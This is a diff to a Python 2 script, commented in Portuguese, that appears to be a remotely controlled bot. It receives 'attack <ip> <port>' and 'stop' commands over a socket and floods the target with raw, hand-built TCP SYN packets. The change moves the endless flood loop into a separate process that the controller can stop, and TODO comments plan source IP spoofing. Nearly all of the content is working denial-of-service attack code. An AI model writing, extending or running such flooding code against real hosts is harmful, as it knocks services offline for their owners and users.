@@ -6,8 +6,10 @@ import socket, sys
 import os
 import re
 import argparse
+import thread
 from struct import *
 from random import randint
+from multiprocessing import Process
 
 
 # Funcoes auxiliares para calculo do checksum
@@ -165,6 +167,17 @@ def receivemessage(socket):
         #sys.stdout.write("Server Response: " + data)
         return data
 
+def attack(raw_socket,attack_type, local_ip, dest_ip, dest_port):
+    print "=== " + local_ip + " Attacking " + dest_ip + " on " + dest_port + " ==="
+    # TODO: Implementar opcao de ataque de acordo com attack_type
+    # TODO: spoof IP local
+    while(1):
+        packet = montaPacote(0,local_ip, dest_ip,  randint(1800,65533),int(dest_port), 5840, 54321)
+        raw_socket.sendto(packet,(dest_ip,0))
+        sleep(1)
+        print "sending attack"
+
+
 #comando para ver processos: ps -eo pid,ppid,stat,cmd
 #comando mais simples: top
 #pid = fork()
@@ -201,7 +214,6 @@ else:
     # Avisa o kernel para nao adicionar headers automaticamente
     raw_s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     # Contadores do programa
-    pkt_counter = 0
     try:
         while alive:
             pkt_counter = 0
@@ -214,17 +226,18 @@ else:
             if data2.startswith("attack"):
                 dest_ip = data2.split()[1]
                 dest_port = data2.split()[2]
-                print local_ip + " Attacking ip " + dest_ip + " on " + dest_port
-                # Cria pacote
-                packet = montaPacote(0,local_ip, dest_ip,  randint(1800,65533),int(dest_port), 5840, 54321)
                 # Flood mode
-                while(1):
-                    raw_s.sendto(packet,(dest_ip,0))
-                    pkt_counter += 1
-                    #print "sending attack"
-                    packet = montaPacote(0,local_ip, dest_ip,  randint(1800,65533),int(dest_port), 5840, 54321)
-                    #packet = montaPacote(0,args.source_ip, args.dest_ip, randint(1800,65533), args.dest_port, args.window_size, args.id)
-                #print "Attacking " + data2.split()[1] + " at port " + data2.split()[2]
+                try:
+                    proc = Process(target=attack,args=(raw_s,"SYN",local_ip,dest_ip,dest_port))
+                    proc.start()
+                    signal = receivemessage(s)
+                    if signal.rstrip() == "stop":
+                        proc.terminate()
+                        print "======= Stop attacking! ========="
+                except:
+                    print "Error: unable to start process"
+
+                #attack(raw_s,"SYN",local_ip,dest_ip,dest_port)
             if data2 == "stop":
                 alive = 1
                 #print "Stop attacking"
